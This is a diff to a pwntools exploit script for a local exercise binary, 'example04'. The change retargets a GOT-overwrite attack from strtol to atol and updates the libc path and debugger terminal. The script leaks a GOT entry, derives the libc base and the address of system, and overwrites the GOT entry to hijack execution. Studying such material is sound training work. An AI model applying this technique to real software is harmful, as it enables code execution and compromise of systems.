@@ -1,6 +1,7 @@
 from pwn import *  # NOQA
 
 context.log_level = 'debug'
+context.terminal = ['tmux', 'splitw', '-h']
 
 
 def write(what, where):
@@ -14,21 +15,21 @@ def read(where):
 
 
 binary = ELF('./example04')
-libc = ELF('/nix/store/7p1v1b6ys9fydg5kdqvr5mpr8svhwf4p-glibc-2.31/lib/libc.so.6')
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 p = process('./example04')
 gdb.attach(p)
 
-strtol_got = binary.symbols['got.strtol']
+atol_got = binary.symbols['got.atol']
 numbers = binary.symbols['numbers']
-offset = (strtol_got - numbers) / 8
+offset = (atol_got - numbers) / 8
 
 write(1, 1)
-strtol_leak = read(offset)
+atol_leak = read(offset)
 
-libc_base = strtol_leak - libc.symbols['strtol']
+libc_base = atol_leak - libc.symbols['atol']
 system_addr = libc_base + libc.symbols['system']
 
-print(hex(strtol_leak))
+print(hex(atol_leak))
 print(hex(system_addr))
 
 write(system_addr, offset)
